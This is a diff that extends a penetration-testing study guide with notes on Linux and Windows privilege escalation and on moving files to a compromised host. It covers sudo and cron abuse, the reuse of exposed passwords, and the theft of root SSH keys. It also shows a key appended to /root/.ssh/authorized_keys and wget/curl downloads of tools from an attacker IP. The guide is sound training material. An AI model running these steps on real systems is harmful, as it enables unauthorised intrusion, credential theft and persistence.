@@ -3,6 +3,7 @@
   - [Network Requests](#network-requests)
   - [Shell](#shell)
   - [Privilege Escalation](#privilege-escalation)
+  - [Transferring Files](#transferring-files)
   - [Web Enumeration](#web-enumeration)
   - [Tools: General](#tools-general)
   - [Tools: Nmap](#tools-nmap)
@@ -154,17 +155,105 @@ Packing, ciphers, base64/hex/rot encoding
 ## Privilege Escalation
 - We want to escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows.
   
-- PrivEsc Checklists
-  -
-
+- PrivEsc Resources
+  - [HackTricks](https://book.hacktricks.xyz/)
+    - [Linux PrivEsc](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
+    - [Windows PrivEsc](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
+  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+    - [Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+    - [Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 - Enumeration Scripts
+  - Linux enumeration scripts
+    - [LinEnum](https://github.com/rebootuser/LinEnum)
+    - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
+  - Windows enumeration scripts
+    - [Seatbelt](https://github.com/GhostPack/Seatbelt)
+    - [JAWS](https://github.com/411Hall/JAWS)
+  - [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/PEASS-ng) is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
+    - `./linpeas.sh` is one such script from PEASS
+    - These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. 
+    - This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
 - Kernel Exploits
+  - Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist.
+  - E.g. suppose we find that a system's Linux version to be 3.9.0-73-generic. If we Google exploits for this version or use searchsploit, we would find a CVE-2016-5195, otherwise known as [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs). We can search for and download the DirtyCow exploit and run it on the server to gain root access. 
+  - We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems.
+  - It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.
+
 - Vulnerable Software
+  - we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system.
+  - Can then look for public exploits for any installed software.
 - User Privileges
+  - Common ways to exploit certain user privileges:
+    - Sudo
+    - SUID
+    - Window Token Privileges
+  - We can check what sudo privileges we have with the `sudo -l` command.
+    - We can use the su command with sudo to switch to the root user `sudo su -`.
+    - `sudo -l` -> `(user : user) NOPASSWD: /bin/echo`.
+      -  The NOPASSWD entry shows that the /bin/echo command can be executed without a password
+      - As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:
+        - `sudo -u user /bin/echo Hello World!`
+  - [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through sudo. 
+    - We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.
+  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.
+
 - Scheduled Tasks
+  - There are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes.
+    - Usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
+      - 1. Add new scheduled tasks/cron jobs.
+      - 2. Trick them to execute a malicious software
+  - First check if we are allowed to add new scheduled tasks.
+    - In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include: 
+      - 1. /etc/crontab
+      - 2. /etc/cron.d
+      - 3. /var/spool/cron/crontabs/root
+    - If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
+
 - Exposed Credentials
+  - Exposed credentials are very common in configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts previously discussed look for potential passwords in files and provide them to us, as below:
+    - `/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');`
+  - We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user
+    - `su -`
+  - We may also use the user credentials to ssh into the server as that user.
 - SSH Keys
+  - If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it.
+    - `vim id_rsa` -> `chmod 600 id_rsa` -> `ssh user@10.10.10.10 -i id_rsa`
+      - Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
+  - If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:
+    - `ssh-keygen -f key` --> Enter passphrase.
+  - This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
+    - `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
+  - Now, the remote server should allow us to log in as that user by using our private key:
+    - `ssh root@10.10.10.10 -i key`
+
+## Transferring Files
+
+- We will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.
+- Using wget
+  - Run a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. 
+  - First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
+  - Then download the file on the remote host that we have code execution on.
+  - Note that we used our IP 10.10.14.1 and the port our Python server runs on 8000. If the remote server does not have wget, we can use cURL to download the file (using the -o flag to specify the output file name.)
+  - `cd /tmp`
+  - `python3 -m http.server 8000`
+  - `wget http://10.10.14.1:8000/linenum.sh`
+  - `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
+- Using SCP
+  - If we have obtained ssh user credentials on the remote host, we can use scp:
+  - `scp linenum.sh user@remotehost:/tmp/linenum.sh`
+  - Note that we specified the local file name after scp, and the remote directory will be saved to after the :
+- Using Base64
+  - In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
+  - `base64 shell -w 0`
+  - Then copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:
+  - `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
+- Validating File Transfers
+  - To validate the format of a file, we can run the file command on it.
+  - `file shell`
+  - When we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:
+  - `md5sum shell`
+  - Now, we can go to the remote server and run the same command on the file we transferred. If both files have the same md5 hash, the file was transferred correctly.
 
 ## Web Enumeration
 
